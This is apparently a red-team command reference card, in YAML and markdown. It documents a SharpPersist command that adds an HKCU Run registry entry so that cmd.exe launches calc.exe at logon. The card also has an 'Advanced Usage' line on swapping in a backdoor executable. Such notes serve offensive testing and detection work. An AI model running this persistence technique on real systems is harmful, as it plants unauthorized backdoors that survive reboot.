---
type: command
executor: cmd
data: >-
  SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k
  "hkcurun" -v "Test Stuff" -m add
output: null
platforms:
  - Windows
tags:
  - persistence
  - registry
verified: true
validated: true
---

# sharpersist-add-hkcu-run-persistence-cmd-calc

## Command

```cmd
SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
```

## Description

This command uses SharpPersist to add a registry-based persistence entry in the HKCU Run key, configuring it to execute `cmd.exe /c calc.exe` (a test payload) upon user logon. It's useful for establishing simple user-level persistence without admin rights.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t reg | Specifies registry as the persistence type | Yes |
| -c "C:\Windows\System32\cmd.exe" | Path to the command executable (e.g., cmd.exe) | Yes |
| -a "/c calc.exe" | Arguments passed to the command (e.g., run calc.exe) | Yes |
| -k "hkcurun" | Target registry key (hkcurun for HKCU Run) | Yes |
| -v "Test Stuff" | Name of the registry value | Yes |
| -m add | Mode to add the persistence (alternatives: remove, list) | Yes |

## Examples

### Basic Usage

```cmd
SharpPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
```

### Advanced Usage

Adapt for backdoor: Replace -a with `/c C:\path\to\backdoor.exe`.

## Expected Output

`Persistence mechanism 'Test Stuff' added successfully.` followed by registry path confirmation. Verify with `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Test Stuff"` showing the command and args as data.

## Related

- [[procedures/windows-simple-user-registry-persistence]]
- [[tools/sharpersist]]
